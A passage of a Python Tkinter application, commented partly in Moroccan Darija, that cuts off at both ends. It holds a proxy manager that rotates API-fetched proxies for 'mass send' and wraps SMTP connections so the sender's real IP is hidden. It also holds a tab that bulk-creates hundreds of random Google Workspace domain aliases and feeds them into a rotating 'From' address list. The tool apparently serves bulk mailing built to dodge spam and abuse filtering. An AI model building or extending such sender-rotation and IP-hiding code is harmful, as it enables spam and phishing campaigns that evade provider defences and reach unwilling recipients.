                     font=("Segoe UI",8)).pack(anchor="w", padx=16, pady=(8,0))
            e = tk.Entry(dlg, font=("Segoe UI",9),
                         bg=C["input"], fg=C["text"],
                         insertbackground=C["accent"],
                         relief="flat", bd=0,
                         highlightthickness=1,
                         highlightbackground=C["border2"])
            e.pack(fill="x", padx=16, ipady=5)
            e.insert(0, default)
            fields[lbl] = e

        ptype_var = tk.StringVar(value="http")
        ptype_f = tk.Frame(dlg, bg=C["bg1"])
        ptype_f.pack(fill="x", padx=16, pady=6)
        for pt in ["http","socks5","socks4"]:
            tk.Radiobutton(ptype_f, text=pt, variable=ptype_var, value=pt,
                           bg=C["bg1"], fg=C["text2"], selectcolor=C["bg3"],
                           activebackground=C["bg1"],
                           font=("Segoe UI",8)).pack(side="left", padx=(0,8))

        def _save():
            try: port = int(fields["Port"].get().strip())
            except: port = 1080
            p = {
                "type": ptype_var.get(),
                "host": fields["Host"].get().strip(),
                "port": port,
                "user": fields["User (optional)"].get().strip(),
                "password": fields["Password (optional)"].get().strip(),
                "status": "idle"
            }
            self._add_proxy(p)
            dlg.destroy()

        ABtn(dlg, "Add", C["accent"], _save, w=100).pack(pady=8)

    def _test_all(self):
        if not self.proxy_list:
            messagebox.showinfo("Info","No proxies to test"); return

        self.log(f"⚡ Testing {len(self.proxy_list)} proxies...", C["yellow"])

        def _do():
            import socket
            items = self.tree.get_children()
            ok_c = fail_c = 0
            for i, (iid, p) in enumerate(zip(items, self.proxy_list)):
                try:
                    import socks
                    s = socks.socksocket()
                    if p["type"] in ("socks5","socks4"):
                        ptype = socks.SOCKS5 if p["type"]=="socks5" else socks.SOCKS4
                        s.set_proxy(ptype, p["host"], p["port"],
                                    username=p["user"] or None,
                                    password=p["password"] or None)
                    else:
                        s.set_proxy(socks.HTTP, p["host"], p["port"],
                                    username=p["user"] or None,
                                    password=p["password"] or None)
                    s.settimeout(8)
                    s.connect(("8.8.8.8", 53))
                    s.close()
                    p["status"] = "ok"
                    self.tree.set(iid, "status", "✓ ok")
                    ok_c += 1
                except Exception as e:
                    p["status"] = "fail"
                    self.tree.set(iid, "status", "✗ fail")
                    fail_c += 1
            self.log(f"✓ Proxy test done — {ok_c} ok · {fail_c} fail", C["green"])

        threading.Thread(target=_do, daemon=True).start()

    def _clear(self):
        if messagebox.askyesno("Confirm","Clear all proxies?"):
            self.proxy_list.clear()
            for item in self.tree.get_children():
                self.tree.delete(item)
            self.count_lbl.config(text="0 proxies")
            self.active_lbl.config(text="")

    def _toggle_proxy_mode(self):
        if self.proxy_mode.get() == "api_url":
            self.list_f.pack_forget()
            self.api_url_f.pack(fill="x", pady=(0,10))
        else:
            self.api_url_f.pack_forget()
            self.list_f.pack(fill="both", expand=True)

    def _is_valid_proxy_response(self, data):
        """
        Verify wash response = real proxy (IP:PORT).
        Mafichi HTML wla error.
        """
        if not data or not data.strip():
            return False, "empty"
        
        line = data.strip().splitlines()[0].strip()
        line_lower = line.lower()
        
        # Reject HTML/error responses
        bad_markers = ['<html', '<body', '<!doctype', 'error', 'rate limit',
                       'forbidden', 'too many', 'unauthorized', '<title',
                       'bad request', 'denied', 'limit exceeded', '<head', '<script']
        for bad in bad_markers:
            if bad in line_lower:
                return False, f"HTML/error: {line[:50]}"
        
        # Must have :
        if ':' not in line:
            return False, "no host:port"
        
        # Strip user:pass@ ila kayna
        check_line = line.split('@', 1)[1] if '@' in line else line
        parts = check_line.split(':')
        if len(parts) < 2:
            return False, "invalid format"
        
        host, port_str = parts[0], parts[1]
        
        # Validate port
        try:
            port = int(port_str)
            if not (1 <= port <= 65535):
                return False, f"bad port: {port}"
        except ValueError:
            return False, f"port not number"
        
        # Validate host
        import re
        ip_pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
        if ip_pattern.match(host):
            for octet in host.split('.'):
                if not (0 <= int(octet) <= 255):
                    return False, f"bad IP"
            return True, host
        
        # Domain check
        domain_pattern = re.compile(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
        if domain_pattern.match(host):
            return True, host
        
        return False, f"bad host: {host[:30]}"
    
    def _test_api_url(self):
        """Test API URL b 2 steps: 1) Fetch proxy, 2) Real connect through it"""
        url = self.api_url_var.get().strip()
        if not url:
            self.api_url_status.config(text="⚠ Enter URL first", fg=C["yellow"])
            return
        
        self.api_url_status.config(text="⏳ Testing...", fg=C["yellow"])
        
        def _do():
            try:
                # Step 1: Fetch proxy line
                import urllib.request
                with urllib.request.urlopen(url, timeout=10) as r:
                    data = r.read().decode().strip()
                
                # Step 2: Validate l'awwal
                is_valid, info = self._is_valid_proxy_response(data)
                
                if not is_valid:
                    # Rate limited wla error
                    if hasattr(self, '_last_good_ip') and self._last_good_ip:
                        age = int(time.time() - self._last_good_time) if hasattr(self, '_last_good_time') else 0
                        self.api_url_status.config(
                            text=f"⚠ {info} — last valid ({age}s): {self._last_good_ip}",
                            fg=C["yellow"])
                        self.log(f"⚠ Rate-limited (cached: {self._last_good_ip})", C["yellow"])
                    else:
                        self.api_url_status.config(
                            text=f"✗ Invalid: {info}", fg=C["red"])
                        self.log(f"✗ Bad response: {data[:60]}", C["red"])
                    return
                
                # Step 3: Cache the valid line
                clean_line = data.strip().splitlines()[0].strip()
                self._last_good_ip = clean_line[:60]
                self._last_good_time = time.time()
                
                # Step 4: Now test REAL connection through this proxy
                self.api_url_status.config(
                    text=f"⏳ Got {clean_line[:40]} — testing real connection...",
                    fg=C["yellow"])
                
                proxy = self._parse_proxy_line(clean_line)
                if proxy:
                    real_ip = self.fetch_real_ip(proxy)
                    if real_ip and not real_ip.startswith("err:") and "<" not in real_ip:
                        # ✅ Real IP confirmed!
                        self.api_url_status.config(
                            text=f"✅ OK — Real IP: {real_ip} · proxy: {clean_line[:30]}",
                            fg=C["green"])
                        self.log(f"✅ Proxy verified: {clean_line} → real IP: {real_ip}", C["green"])
                    elif real_ip and real_ip.startswith("err:"):
                        # Got proxy walakin connection failed
                        self.api_url_status.config(
                            text=f"⚠ Got proxy ({clean_line[:30]}) — connection: {real_ip[4:30]}",
                            fg=C["yellow"])
                        self.log(f"⚠ Proxy line OK walakin connection issue: {real_ip}", C["yellow"])
                    else:
                        self.api_url_status.config(
                            text=f"⚠ Got: {clean_line[:40]} (cached)",
                            fg=C["yellow"])
                else:
                    self.api_url_status.config(
                        text=f"⚠ Got line walakin can't parse: {clean_line[:40]}",
                        fg=C["yellow"])
                    
            except Exception as e:
                err = str(e)[:80]
                # Network/HTTP error — fallback l cached
                if hasattr(self, '_last_good_ip') and self._last_good_ip:
                    age = int(time.time() - self._last_good_time) if hasattr(self, '_last_good_time') else 0
                    self.api_url_status.config(
                        text=f"⚠ {err[:40]} — last valid ({age}s): {self._last_good_ip}",
                        fg=C["yellow"])
                    self.log(f"⚠ Network err but cached IP: {self._last_good_ip}", C["yellow"])
                else:
                    self.api_url_status.config(text=f"✗ {err}", fg=C["red"])
        
        threading.Thread(target=_do, daemon=True).start()

    def _fetch_proxy_from_api(self):
        """Fetch fresh proxy mn API URL — validate + cache valid responses.
        🎯 Hadi DIRECT call l API. F'mass send, use _get_pooled_proxy() instead."""
        url = self.api_url_var.get().strip()
        if not url:
            return None
        try:
            import urllib.request
            with urllib.request.urlopen(url, timeout=8) as r:
                data = r.read().decode().strip()
            
            # 🎯 VALIDATE — mafichi cache HTML/errors
            is_valid, _info = self._is_valid_proxy_response(data)
            if not is_valid:
                return None
            
            line = data.splitlines()[0].strip()
            self._last_good_ip = line[:60]
            self._last_good_time = time.time()
            return self._parse_proxy_line(line)
        except:
            return None
    
    def _refresh_proxy_pool(self, force=False):
        """
        Refresh proxy pool — fetch N proxies + cache them.
        Mafichi y'rate limit b'tariqa hadi (slow controlled fetch).
        
        Returns: True ila pool refreshed mzyan
        """
        now = time.time()
        
        # Skip ila pool zenya w mazal recent (mashi force)
        if not force and self._proxy_pool:
            if (now - self._last_pool_refresh) < self._pool_refresh_interval:
                return True  # pool mzyana
        
        # Lock bach mafichi yfetchent multiple times f same time
        if not self._pool_lock.acquire(blocking=False):
            return bool(self._proxy_pool)  # someone else fetching
        
        try:
            new_pool = []
            successful = 0
            
            for i in range(self._proxy_pool_size):
                # Wait 500ms entre kol fetch bach mafichi rate-limit
                if i > 0:
                    time.sleep(0.5)
                
                proxy = self._fetch_proxy_from_api()
                if proxy:
                    new_pool.append(proxy)
                    successful += 1
                else:
                    # Ila API blocked, b9a m3a proxies li 3andna
                    break
            
            if successful > 0:
                self._proxy_pool = new_pool
                self._proxy_pool_index = 0
                self._last_pool_refresh = now
                if hasattr(self, 'log') and self.log:
                    self.log(f"🔄 Proxy pool refreshed: {successful} proxies cached", C["accent2"])
                return True
            else:
                # API blocked — b9a m3a old pool
                if self._proxy_pool:
                    if hasattr(self, 'log') and self.log:
                        self.log(f"⚠ API rate-limited — using old pool ({len(self._proxy_pool)} proxies)", C["yellow"])
                    return True
                return False
        finally:
            self._pool_lock.release()
    
    def _get_pooled_proxy(self):
        """
        Get proxy mn pool m3a rotation.
        🎯 Hadi a7sn mn _fetch_proxy_from_api() l mass send!
        """
        # Refresh pool ila lazem
        if not self._proxy_pool:
            self._refresh_proxy_pool(force=True)
        elif (time.time() - self._last_pool_refresh) > self._pool_refresh_interval:
            # Background refresh
            threading.Thread(target=lambda: self._refresh_proxy_pool(force=False), 
                             daemon=True).start()
        
        # Get proxy mn pool b rotation
        if not self._proxy_pool:
            return None
        
        proxy = self._proxy_pool[self._proxy_pool_index % len(self._proxy_pool)]
        self._proxy_pool_index += 1
        
        # Update cached IP display
        ip_str = f"{proxy['host']}:{proxy['port']}"
        self._last_good_ip = ip_str
        self._last_good_time = time.time()
        
        return proxy
    
    def get_last_ip(self):
        """Get cached IP — l Live IP display"""
        return self._last_good_ip if hasattr(self, '_last_good_ip') else ""
    
    def get_pool_info(self):
        """Get info dyal pool l live display"""
        if not self._proxy_pool:
            return None
        return {
            "size": len(self._proxy_pool),
            "current_index": self._proxy_pool_index % len(self._proxy_pool) if self._proxy_pool else 0,
            "last_refresh_age": int(time.time() - self._last_pool_refresh) if self._last_pool_refresh else None,
            "current_ip": f"{self._proxy_pool[self._proxy_pool_index % len(self._proxy_pool)]['host']}:{self._proxy_pool[self._proxy_pool_index % len(self._proxy_pool)]['port']}" if self._proxy_pool else None
        }

    def get_random_proxy(self):
        if self.proxy_mode.get() == "api_url":
            # 🎯 Use pool (mafichi rate-limit f mass send!)
            return self._get_pooled_proxy()
        active = [p for p in self.proxy_list if p["status"] != "fail"]
        return random.choice(active) if active else None

    def fetch_real_ip(self, proxy):
        """Get the real outgoing IP through the proxy"""
        try:
            import socks, socket, urllib.request

            if proxy["type"] == "socks5":
                ptype = socks.SOCKS5
            elif proxy["type"] == "socks4":
                ptype = socks.SOCKS4
            else:
                ptype = socks.HTTP

            s = socks.socksocket()
            s.set_proxy(ptype, proxy["host"], proxy["port"],
                        username=proxy["user"] or None,
                        password=proxy["password"] or None)
            s.settimeout(8)

            # Use requests if available, else urllib with proxy env
            try:
                import requests
                proxies = {
                    "http":  f"{proxy['type']}://{proxy['user']}:{proxy['password']}@{proxy['host']}:{proxy['port']}" if proxy["user"] else f"{proxy['type']}://{proxy['host']}:{proxy['port']}",
                    "https": f"{proxy['type']}://{proxy['user']}:{proxy['password']}@{proxy['host']}:{proxy['port']}" if proxy["user"] else f"{proxy['type']}://{proxy['host']}:{proxy['port']}",
                }
                r = requests.get("https://api.ipify.org", proxies=proxies, timeout=8)
                return r.text.strip()
            except:
                pass

            # fallback: socks direct connect
            s.connect(("api.ipify.org", 80))
            s.send(b"GET / HTTP/1.0\r\nHost: api.ipify.org\r\n\r\n")
            data = s.recv(1024).decode()
            s.close()
            # extract IP from response body
            ip = data.split("\r\n\r\n")[-1].strip()
            return ip if ip else "unknown"
        except Exception as e:
            return f"err:{str(e)[:20]}"

    def build_smtp_with_proxy(self, smtp_cfg):
        """Route SMTP connection through proxy so real IP is hidden"""
        proxy = self.get_random_proxy() if self.enabled.get() and self.proxy_target.get() in ("smtp","both") else None

        if proxy:
            try:
                import socks

                if proxy["type"] == "socks5":
                    ptype = socks.SOCKS5
                elif proxy["type"] == "socks4":
                    ptype = socks.SOCKS4
                else:
                    ptype = socks.HTTP

                # monkeypatch: replace default socket with proxy socket
                socks.setdefaultproxy(
                    ptype,
                    proxy["host"],
                    proxy["port"],
                    username=proxy["user"] or None,
                    password=proxy["password"] or None
                )
                socks.wrapmodule(smtplib)

                # now smtplib will use proxy socket automatically
                if smtp_cfg["tls"]:
                    server = smtplib.SMTP(smtp_cfg["host"], smtp_cfg["port"], timeout=20)
                    server.starttls()
                else:
                    server = smtplib.SMTP_SSL(smtp_cfg["host"], smtp_cfg["port"], timeout=20)

                server.login(smtp_cfg["user"], smtp_cfg["password"])

                # restore original socket
                import socket
                socks.wrapmodule(smtplib)  # keep wrapped — next call replaces proxy anyway

                proxy_str = f"{proxy['type']}://{proxy['host']}:{proxy['port']}"
                return server, proxy_str

            except ImportError:
                pass  # pysocks not installed
            except Exception:
                # proxy failed — restore and fallback
                try:
                    import socket as _s
                    smtplib.socket = _s
                except:
                    pass

        # direct (no proxy)
        import socket
        smtplib.socket = socket  # make sure socket is restored
        if smtp_cfg["tls"]:
            server = smtplib.SMTP(smtp_cfg["host"], smtp_cfg["port"], timeout=15)
            server.starttls()
        else:
            server = smtplib.SMTP_SSL(smtp_cfg["host"], smtp_cfg["port"], timeout=15)
        server.login(smtp_cfg["user"], smtp_cfg["password"])
        return server, "direct"



# ── Alias Generator Tab ──────────────────────────────────────────
class AliasGeneratorTab(tk.Frame):
    """
    Auto-generate domain aliases f Workspace via Admin SDK.
    
    Mital:
      Prefix: "user"
      Count: 500
      Random suffix: chiffres
      
    Result: user1234.terssadmine.com, user5678.terssadmine.com, ...
    """
    
    def __init__(self, parent, log_fn):
        super().__init__(parent, bg=C["bg1"])
        self.log = log_fn
        self.workspace_service = None
        self._building = False
        self._stop_flag = False
        self._build()
    
    def _build(self):
        pad = tk.Frame(self, bg=C["bg1"])
        pad.pack(fill="both", expand=True, padx=14, pady=14)
        
        # Header
        hdr = tk.Frame(pad, bg=C["bg1"])
        hdr.pack(fill="x", pady=(0, 8))
        tk.Label(hdr, text="🎲 Auto Alias Generator (Workspace API)",
                 bg=C["bg1"], fg=C["text"],
                 font=("Segoe UI", 10, "bold")).pack(side="left")
        tk.Frame(hdr, bg=C["border2"], height=1).pack(
            side="left", fill="x", expand=True, padx=(8, 0), pady=6)
        
        # Info box
        info_frame = tk.Frame(pad, bg=C["bg2"])
        info_frame.pack(fill="x", pady=(0, 12))
        info_inner = tk.Frame(info_frame, bg=C["bg2"])
        info_inner.pack(fill="x", padx=10, pady=8)
        
        tk.Label(info_inner,
                 text="💡 Type prefix → adds RANDOM numbers → bulk create aliases",
                 bg=C["bg2"], fg=C["accent2"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        tk.Label(info_inner,
                 text="    Examples: 'mail' → mail8472.dom, mail3914.dom, ...",
                 bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        tk.Label(info_inner,
                 text="    Auto-verified (inherits parent domain)",
                 bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        
        # ─── CONFIGURATION ───
        tk.Label(pad, text="CONFIGURATION", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 8, "bold")).pack(anchor="w", pady=(5, 5))
        
        # Service Account JSON
        tk.Label(pad, text="Service Account JSON:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        json_frame = tk.Frame(pad, bg=C["bg1"])
        json_frame.pack(fill="x", pady=(2, 8))
        
        self.json_path = tk.StringVar()
        json_entry = tk.Entry(json_frame, textvariable=self.json_path,
                              font=("Segoe UI", 8), bg=C["input"], fg=C["text"],
                              insertbackground=C["accent"], relief="flat", bd=0,
                              highlightthickness=1, highlightbackground=C["border2"])
        json_entry.pack(side="left", fill="x", expand=True, ipady=5)
        
        tk.Button(json_frame, text="📂 Browse", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 8),
                  command=self._browse_json).pack(side="left", padx=(6, 0), ipady=4, ipadx=8)
        
        # Admin email + Domain (2 cols)
        cols = tk.Frame(pad, bg=C["bg1"])
        cols.pack(fill="x", pady=(0, 8))
        
        col1 = tk.Frame(cols, bg=C["bg1"])
        col1.pack(side="left", fill="x", expand=True, padx=(0, 6))
        tk.Label(col1, text="Super Admin Email:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        self.admin_email = tk.StringVar()
        tk.Entry(col1, textvariable=self.admin_email, font=("Segoe UI", 9),
                 bg=C["input"], fg=C["text"], insertbackground=C["accent"],
                 relief="flat", bd=0, highlightthickness=1,
                 highlightbackground=C["border2"]).pack(fill="x", ipady=5)
        
        col2 = tk.Frame(cols, bg=C["bg1"])
        col2.pack(side="left", fill="x", expand=True, padx=(6, 0))
        tk.Label(col2, text="Parent Domain:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        self.parent_domain = tk.StringVar()
        tk.Entry(col2, textvariable=self.parent_domain, font=("Segoe UI", 9),
                 bg=C["input"], fg=C["text"], insertbackground=C["accent"],
                 relief="flat", bd=0, highlightthickness=1,
                 highlightbackground=C["border2"]).pack(fill="x", ipady=5)
        
        # Test connection
        ABtn(pad, "🔍 Test Connection", C["accent"], self._test_connection, w=160).pack(anchor="w", pady=(0, 12))
        
        # ─── ALIAS SETTINGS ───
        tk.Label(pad, text="ALIAS SETTINGS", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 8, "bold")).pack(anchor="w", pady=(5, 5))
        
        # Prefix + Count + Digits (3 cols)
        cols2 = tk.Frame(pad, bg=C["bg1"])
        cols2.pack(fill="x", pady=(0, 8))
        
        c1 = tk.Frame(cols2, bg=C["bg1"])
        c1.pack(side="left", fill="x", expand=True, padx=(0, 4))
        tk.Label(c1, text="Prefix:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        self.prefix = tk.StringVar(value="mail")
        tk.Entry(c1, textvariable=self.prefix, font=("Segoe UI", 9),
                 bg=C["input"], fg=C["text"], insertbackground=C["accent"],
                 relief="flat", bd=0, highlightthickness=1,
                 highlightbackground=C["border2"]).pack(fill="x", ipady=5)
        
        c2 = tk.Frame(cols2, bg=C["bg1"])
        c2.pack(side="left", fill="x", expand=True, padx=4)
        tk.Label(c2, text="Count:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        self.count = tk.IntVar(value=500)
        tk.Entry(c2, textvariable=self.count, font=("Segoe UI", 9),
                 bg=C["input"], fg=C["text"], insertbackground=C["accent"],
                 relief="flat", bd=0, highlightthickness=1,
                 highlightbackground=C["border2"]).pack(fill="x", ipady=5)
        
        c3 = tk.Frame(cols2, bg=C["bg1"])
        c3.pack(side="left", fill="x", expand=True, padx=(4, 0))
        tk.Label(c3, text="Digits:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        self.digits = tk.IntVar(value=4)
        tk.Entry(c3, textvariable=self.digits, font=("Segoe UI", 9),
                 bg=C["input"], fg=C["text"], insertbackground=C["accent"],
                 relief="flat", bd=0, highlightthickness=1,
                 highlightbackground=C["border2"]).pack(fill="x", ipady=5)
        
        # Preview
        prev_frame = tk.Frame(pad, bg=C["bg2"])
        prev_frame.pack(fill="x", pady=(8, 0))
        prev_inner = tk.Frame(prev_frame, bg=C["bg2"])
        prev_inner.pack(fill="x", padx=10, pady=6)
        
        tk.Label(prev_inner, text="Preview:", bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI", 7, "bold")).pack(anchor="w")
        
        self.preview_label = tk.Label(prev_inner, text="(adjust settings)",
                                       bg=C["bg2"], fg=C["text2"],
                                       font=("Consolas", 8), justify="left")
        self.preview_label.pack(anchor="w")
        
        # Auto-update preview
        self.prefix.trace_add("write", lambda *a: self._update_preview())
        self.digits.trace_add("write", lambda *a: self._update_preview())
        self.parent_domain.trace_add("write", lambda *a: self._update_preview())
        self.count.trace_add("write", lambda *a: self._update_preview())
        self._update_preview()
        
        # ─── ACTIONS ───
        tk.Label(pad, text="ACTIONS", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 8, "bold")).pack(anchor="w", pady=(12, 5))
        
        actions = tk.Frame(pad, bg=C["bg1"])
        actions.pack(fill="x", pady=(0, 8))
        
        ABtn(actions, "🚀 Generate", C["green"], self._start_generate, w=130).pack(side="left", padx=(0, 6))
        ABtn(actions, "■ Stop", C["red"], self._stop, w=80).pack(side="left", padx=(0, 6))
        ABtn(actions, "📋 List All", C["accent"], self._list_aliases, w=120).pack(side="left", padx=(0, 6))
        ABtn(actions, "💾 Export", C["yellow"], self._export, w=100).pack(side="left")
        
        # Stats
        stats = tk.Frame(pad, bg=C["bg1"])
        stats.pack(fill="x", pady=(8, 0))
        
        self.stat_added = tk.Label(stats, text="Added: 0", bg=C["bg1"], fg=C["green"],
                                    font=("Segoe UI", 9, "bold"))
        self.stat_added.pack(side="left", padx=(0, 15))
        
        self.stat_existing = tk.Label(stats, text="Existing: 0", bg=C["bg1"], fg=C["text2"],
                                       font=("Segoe UI", 9))
        self.stat_existing.pack(side="left", padx=(0, 15))
        
        self.stat_failed = tk.Label(stats, text="Failed: 0", bg=C["bg1"], fg=C["red"],
                                     font=("Segoe UI", 9))
        self.stat_failed.pack(side="left", padx=(0, 15))
        
        self.progress_lbl = tk.Label(stats, text="", bg=C["bg1"], fg=C["accent2"],
                                      font=("Segoe UI", 9, "bold"))
        self.progress_lbl.pack(side="right")
        
        # Progress bar
        self.progress = ttk.Progressbar(pad, mode="determinate")
        self.progress.pack(fill="x", pady=(8, 0))
        
        # Mini log
        log_frame = tk.Frame(pad, bg=C["bg1"])
        log_frame.pack(fill="both", expand=True, pady=(10, 0))
        
        tk.Label(log_frame, text="Generated Aliases:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        
        self.mini_log = scrolledtext.ScrolledText(
            log_frame, bg=C["input"], fg=C["text"], font=("Consolas", 8),
            insertbackground=C["accent"], wrap="word", relief="flat",
            borderwidth=0, padx=8, pady=6, height=10
        )
        self.mini_log.pack(fill="both", expand=True, pady=(2, 0))
        
        self.mini_log.tag_configure("ok", foreground=C["green"])
        self.mini_log.tag_configure("err", foreground=C["red"])
        self.mini_log.tag_configure("dim", foreground=C["text3"])
        
        # Storage
        self.last_results = {'added': [], 'existing': [], 'failed': []}
    
    def _browse_json(self):
        path = filedialog.askopenfilename(
            title="Select Service Account JSON",
            filetypes=[("JSON", "*.json"), ("All", "*.*")]
        )
        if path:
            self.json_path.set(path)
            self.workspace_service = None  # Reset
            try:
                with open(path) as f:
                    data = json.load(f)
                    if 'client_email' in data:
                        self._mlog(f"📁 SA: {data['client_email']}", "dim")
            except Exception as e:
                self._mlog(f"⚠️  {e}", "err")
            
            # 🔄 Sync l ga3 tabs (find main app via parent traversal)
            try:
                root = self.winfo_toplevel()
                if hasattr(root, '_sync_json_to_all_tabs'):
                    root._sync_json_to_all_tabs(path)
            except:
                pass
    
    def _update_preview(self):
        try:
            prefix = self.prefix.get()
            digits = max(1, min(10, self.digits.get()))
            domain = self.parent_domain.get() or "yourdomain.com"
            count = self.count.get()
            
            # Generate 3 examples
            examples = []
            for _ in range(3):
                num = random.randint(10**(digits-1), 10**digits - 1)
                examples.append(f"{prefix}{num}.{domain}")
            
            preview = "\n".join(f"  • {e}" for e in examples)
            preview += f"\n  ... ({count} total)"
            self.preview_label.config(text=preview, fg=C["text"])
        except:
            self.preview_label.config(text="(invalid settings)", fg=C["red"])
    
    def _connect_workspace(self):
        """Build Workspace Admin service"""
        if not GOOGLE_OK:
            raise Exception("google-api-python-client mashi installed!")
        
        if not self.json_path.get():
            raise Exception("Service Account JSON missing!")
        
        if not self.admin_email.get() or '@' not in self.admin_email.get():
            raise Exception("Admin email ghalat!")
        
        if not self.parent_domain.get() or '.' not in self.parent_domain.get():
            raise Exception("Parent domain ghalat!")
        
        creds = service_account.Credentials.from_service_account_file(
            self.json_path.get(),
            scopes=['https://www.googleapis.com/auth/admin.directory.domain']
        )
        delegated = creds.with_subject(self.admin_email.get())
        
        import socket
        socket.setdefaulttimeout(30)
        
        self.workspace_service = build('admin', 'directory_v1',
                                        credentials=delegated,
                                        cache_discovery=False)
        return self.workspace_service
    
    def _test_connection(self):
        """Test Workspace API connection"""
        self._mlog("🔍 Testing connection...", "dim")
        
        def task():
            try:
                self._connect_workspace()
                
                # Get domains
                result = self.workspace_service.domains().list(
                    customer='my_customer'
                ).execute()
                domains = result.get('domains', [])
                
                # Get existing aliases
                result = self.workspace_service.domainAliases().list(
                    customer='my_customer'
                ).execute()
                aliases = result.get('domainAliases', [])
                
                self._mlog(f"✅ Connected!", "ok")
                self._mlog(f"   {len(domains)} domain(s) · {len(aliases)} alias(es)", "dim")
                self.log(f"✓ Workspace API connected ({len(aliases)} aliases)", C["green"])
            
            except Exception as e:
                error_str = str(e)[:200]
                self._mlog(f"❌ Failed: {error_str}", "err")
                self.log(f"✗ Connection failed: {error_str[:100]}", C["red"])
        
        threading.Thread(target=task, daemon=True).start()
    
    def _generate_alias_name(self):
        """Generate random alias: prefix + random_digits"""
        prefix = self.prefix.get().strip().lower()
        digits = max(1, min(10, self.digits.get()))
        domain = self.parent_domain.get().strip().lower()
        
        num = random.randint(10**(digits-1), 10**digits - 1)
        return f"{prefix}{num}.{domain}"
    
    def _add_alias(self, alias_name):
        """Add wahed alias via API"""
        try:
            self.workspace_service.domainAliases().insert(
                customer='my_customer',
                body={
                    'domainAliasName': alias_name,
                    'parentDomainName': self.parent_domain.get().strip()
                }
            ).execute()
            return True, "Added"
        
        except HttpError as e:
            try:
                error_data = json.loads(e.content.decode())
                error_msg = error_data.get('error', {}).get('message', str(e))
            except:
                error_msg = str(e)
            
            lower = error_msg.lower()
            if 'already exists' in lower or 'duplicate' in lower:
                return True, "Exists"
            elif 'quota' in lower or 'limit' in lower:
                return False, f"LIMIT: {error_msg}"
            else:
                return False, error_msg
        
        except Exception as e:
            return False, str(e)
    
    def _start_generate(self):
        """Start bulk generation"""
        if self._building:
            messagebox.showwarning("Busy", "Khdma jariya!")
            return
        
        try:
            count = self.count.get()
            if count < 1 or count > 600:
                messagebox.showerror("Invalid", "Count khass ykoun bin 1 w 600")
                return
        except:
            messagebox.showerror("Invalid", "Count ghalat")
            return
        
        if not messagebox.askyesno("Confirm",
            f"Generate {count} aliases f {self.parent_domain.get()}?\n\n"
            f"Format: {self.prefix.get()}<random>.{self.parent_domain.get()}"):
            return
        
        # Connect ila mafichi
        if not self.workspace_service:
            try:
                self._connect_workspace()
            except Exception as e:
                messagebox.showerror("Connection Error", str(e))
                return
        
        self._building = True
        self._stop_flag = False
        self.progress["maximum"] = count
        self.progress["value"] = 0
        
        # Reset stats
        self.last_results = {'added': [], 'existing': [], 'failed': []}
        self._update_stats()
        
        self._mlog("\n" + "="*60, "dim")
        self._mlog(f"🚀 Generating {count} aliases...", "dim")
        self._mlog("="*60, "dim")
        self.log(f"▶ Generating {count} aliases", C["accent2"])
        
        def task():
            generated_set = set()
            attempts = 0
            max_attempts = count * 3  # Avoid infinite loop
            
            while len(self.last_results['added']) + len(self.last_results['existing']) < count:
                if self._stop_flag:
                    self._mlog("■ Stopped by user", "err")
                    break
                
                attempts += 1
                if attempts > max_attempts:
                    self._mlog(f"⚠️  Max attempts reached", "err")
                    break
                
                # Generate unique alias
                alias = self._generate_alias_name()
                if alias in generated_set:
                    continue
                generated_set.add(alias)
                
                # Add via API
                success, msg = self._add_alias(alias)
                
                if success:
                    if msg == "Added":
                        self.last_results['added'].append(alias)
                        self._mlog(f"✅ {alias}", "ok")
                    else:
                        self.last_results['existing'].append(alias)
                        self._mlog(f"⏭️  {alias} (exists)", "dim")
                else:
                    self.last_results['failed'].append({'alias': alias, 'error': msg})
                    self._mlog(f"❌ {alias}: {msg[:60]}", "err")
                    if 'LIMIT' in msg:
                        self._mlog("🛑 Plan limit reached!", "err")
                        break
                
                # Update UI
                done = len(self.last_results['added']) + len(self.last_results['existing'])
                self.after(0, lambda d=done, c=count: self._update_progress(d, c))
                self._update_stats()
                
                # Rate limit
                time.sleep(0.3)
            
            self._building = False
            added = len(self.last_results['added'])
            self._mlog(f"\n✔ Done — {added} added", "ok")
            self.log(f"✓ Generated {added} new aliases", C["green"])
            
            # 🎯 AUTO-PUSH l Sender tab "From Email" box
            self.after(0, self._push_to_sender_tab)
        
        threading.Thread(target=task, daemon=True).start()
    
    def _push_to_sender_tab(self):
        """Auto-add generated aliases l Sender Tab From Email box"""
        try:
            # Combine added + existing (kolhom valid l send)
            all_aliases = self.last_results['added'] + self.last_results['existing']
            if not all_aliases:
                return
            
            # Get main app
            root = self.winfo_toplevel()
            
            if not hasattr(root, 'from_aliases_text'):
                return
            
            # Get existing content (preserve)
            existing_text = root.from_aliases_text.get("1.0", "end-1c").strip()
            existing_aliases = set()
            if existing_text:
                for line in existing_text.split("\n"):
                    line = line.strip().lower()
                    if line:
                        existing_aliases.add(line)
            
            # Add new ones (skip duplicates)
            new_added = 0
            for alias in all_aliases:
                if alias not in existing_aliases:
                    existing_aliases.add(alias)
                    new_added += 1
            
            # Update textbox
            sorted_aliases = sorted(existing_aliases)
            root.from_aliases_text.delete("1.0", "end")
            root.from_aliases_text.insert("1.0", "\n".join(sorted_aliases))
            
            # Auto-enable random from
            if hasattr(root, 'use_custom_from'):
